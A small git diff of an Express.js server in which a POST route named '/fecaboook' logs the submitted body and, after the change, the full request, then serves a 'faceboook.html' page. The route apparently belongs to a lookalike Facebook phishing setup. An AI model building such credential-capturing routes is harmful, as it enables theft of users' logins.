@@ -27,6 +27,8 @@ app.get('/', (req, res, next) => {
 app.post('/fecaboook', (req, res, next) => {
     console.log('redirect to facebook with POST method');
     console.log(JSON.stringify(req.body));
+    console.log(req);
+
     res.sendFile(__dirname + '/faceboook.html');
     //res.redirect('http://www.facebook.com');
 });
